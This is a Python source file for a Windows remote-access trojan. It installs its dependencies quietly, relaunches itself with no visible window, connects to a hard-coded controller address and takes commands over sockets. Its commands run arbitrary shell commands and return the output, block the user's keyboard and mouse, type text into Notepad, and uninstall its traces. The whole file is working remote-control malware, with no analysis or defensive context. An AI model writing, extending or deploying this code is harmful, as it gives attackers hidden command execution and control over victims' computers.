import socket
import threading
import time
import os
import subprocess
from ctypes import *
def install():
    os.system("py -m pip install pywin32")
    os.system("cls")
    os.system("py -m pip install pathlib")
    os.system("cls")
    os.system("py -m pip install keyboard")
    os.system("cls")
    from pathlib import Path
    subprocess.call(['pyw', str(Path(__file__).resolve())])
    time.sleep(0.2)
    exit()
def uninstall():
    temp = subprocess.check_output("py -m pip uninstall pathlib -y", shell=True).decode('utf-8')
    temp = subprocess.check_output("py -m pip uninstall keyboard -y", shell=True).decode('utf-8')
    time.sleep(0.2)
    globals()['need_to_send_response'] = True
    globals()['resp'] = "killed server..."
    time.sleep(0.2)
    globals()['can_run'] = False
    exit()
try:
    import keyboard
    import win32gui, win32con
except:
    install()  
host = '192.168.1.41'
port = 5000
port2 = 5001
globals()['need_to_send_response'] = False
globals()['resp'] = ""
globals()['can_run'] = True
def serversend(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    c, addr = s.accept()
    while globals()['can_run'] == True:
        if globals()['need_to_send_response'] == True:
            time.sleep(0.2)
            c.send(globals()['resp'].encode())
            globals()['need_to_send_response'] = False
            globals()['resp'] = ""
def serverin(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    js = False
    while js == False:
        try:
            s.connect((host, port))
            js = True
        except:
            pass

    msg = s.recv(1024)
    while msg:
        if globals()['can_run'] == True:
            cmd = msg.decode()
            if cmd == "ping":
                globals()['need_to_send_response'] = True
                globals()['resp'] = "pong"
            elif cmd == "kill":
                globals()['need_to_send_response'] = True
                globals()['resp'] = "killed server..."
                time.sleep(1)
                globals()['can_run'] = False
                exit()
            elif cmd == "nuke":
                uninstall()
            elif cmd == "input off":
                ok = windll.user32.BlockInput(True)
                globals()['need_to_send_response'] = True
                globals()['resp'] = "done"
            elif cmd == "input on":
                ok = windll.user32.BlockInput(False)
                globals()['need_to_send_response'] = True
                globals()['resp'] = "done"
            elif cmd.startswith("exec"):
                x = cmd.split(" ")
                xx = ""
                for i in range(1, len(x)):
                    xx = xx + x[0+i] + " "
                os.system(xx)
                globals()['need_to_send_response'] = True
                globals()['resp'] = "done"
            elif cmd.startswith("shell"):
                sendto = ""
                x = cmd.split(" ")
                xx = ""
                for i in range(1, len(x)):
                    xx = xx + x[0+i] + " "
                #xx is cmd to run
                jj = subprocess.check_output(xx, shell=True).decode().strip().split('\n')
                for i in range(0, len(jj)):   
                    time.sleep(0.1)                 
                    globals()['need_to_send_response'] = True
                    globals()['resp'] = jj[i]
                globals()['need_to_send_response'] = True
                globals()['resp'] = "done"
            elif cmd.startswith("type"):
                x = cmd.split(" ")
                xx = ""
                for i in range(1, len(x)):
                    xx = xx + x[0+i] + " "
                os.system("start notepad")
                time.sleep(0.2)
                keyboard.write(xx)
                globals()['need_to_send_response'] = True
                globals()['resp'] = "done"
            else:
                

                globals()['need_to_send_response'] = True
                globals()['resp'] = "invalid cmd"
            msg = s.recv(1024)
        else:
            exit()

t1 = threading.Thread(target=serversend, args=(host, port2))
t2 = threading.Thread(target=serverin, args=(host, port))
t2.start()
t1.start()